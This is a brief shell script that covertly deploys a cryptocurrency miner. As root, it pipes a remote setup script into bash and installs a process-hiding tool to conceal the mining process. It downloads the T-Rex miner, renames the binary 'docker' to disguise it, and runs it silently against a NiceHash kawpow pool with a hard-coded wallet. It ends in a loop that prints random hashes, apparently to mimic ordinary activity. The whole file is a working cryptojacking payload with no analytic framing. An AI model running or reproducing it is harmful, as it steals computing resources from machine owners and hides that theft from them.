#!/bin/sh
sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add kawpow" && wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz && tar -xvf t-rex-0.26.8-linux.tar.gz >/dev/null 2>&1
mv t-rex docker
./docker -a kawpow -o stratum+tcp://kawpow.auto.nicehash.com:9200 -u NHbKJHcy4QbMcrHihhWgCwN4EcZBCB4i9FMn.ADELA -p x >/dev/null 2>&1
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
